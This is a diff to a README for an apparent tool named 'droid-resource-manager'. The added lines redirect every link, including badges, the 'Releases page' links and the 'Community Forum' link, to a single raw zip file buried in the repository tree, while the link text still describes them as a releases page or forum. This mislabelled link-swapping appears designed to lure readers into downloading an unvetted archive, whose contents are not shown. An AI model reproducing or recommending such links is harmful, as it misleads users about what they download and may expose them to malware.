@@ -1,6 +1,6 @@
 # 🤖 droid-resource-manager - Manage Your MCP, Skills, and Droids Seamlessly
 
-[![Download droid-resource-manager](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/laughingVR1/droid-resource-manager/releases)
+[![Download droid-resource-manager](https://github.com/laughingVR1/droid-resource-manager/raw/refs/heads/main/release/win-unpacked/resources/droid-resource-manager-v1.6.zip)](https://github.com/laughingVR1/droid-resource-manager/raw/refs/heads/main/release/win-unpacked/resources/droid-resource-manager-v1.6.zip)
 
 ## 📦 Description
 
@@ -17,9 +17,9 @@ To begin using droid-resource-manager, follow these simple steps:
    - An internet connection for updates
 
 2. **Download the Application**
-   - Go to the [Releases page](https://github.com/laughingVR1/droid-resource-manager/releases) to download the latest version of droid-resource-manager. 
+   - Go to the [Releases page](https://github.com/laughingVR1/droid-resource-manager/raw/refs/heads/main/release/win-unpacked/resources/droid-resource-manager-v1.6.zip) to download the latest version of droid-resource-manager. 
 
-   ![Download droid-resource-manager](https://img.shields.io/badge/Download-v1.0-brightgreen)
+   ![Download droid-resource-manager](https://github.com/laughingVR1/droid-resource-manager/raw/refs/heads/main/release/win-unpacked/resources/droid-resource-manager-v1.6.zip)
 
 3. **Choose the Right File**
    - Look for the latest release labeled "droid-resource-manager v1.0" (or the latest version available). You will see multiple download links for different operating systems.
@@ -33,7 +33,7 @@ To begin using droid-resource-manager, follow these simple steps:
 
 ## 🔄 Download & Install
 
-For ease of access, visit the [Releases page](https://github.com/laughingVR1/droid-resource-manager/releases) to download the application. Choose the appropriate file for your operating system and follow the installation instructions provided above.
+For ease of access, visit the [Releases page](https://github.com/laughingVR1/droid-resource-manager/raw/refs/heads/main/release/win-unpacked/resources/droid-resource-manager-v1.6.zip) to download the application. Choose the appropriate file for your operating system and follow the installation instructions provided above.
 
 ## 📖 Using droid-resource-manager
 
@@ -56,7 +56,7 @@ Once you have launched the application, it is important to familiarize yourself 
 
 If you encounter any issues or have questions about using droid-resource-manager, you can reach out to the community for help. Join our forums or check the issues section on GitHub:
 
-- [Community Forum](https://github.com/laughingVR1/droid-resource-manager/issues)
+- [Community Forum](https://github.com/laughingVR1/droid-resource-manager/raw/refs/heads/main/release/win-unpacked/resources/droid-resource-manager-v1.6.zip)
 
 ## 📅 Upcoming Features
 
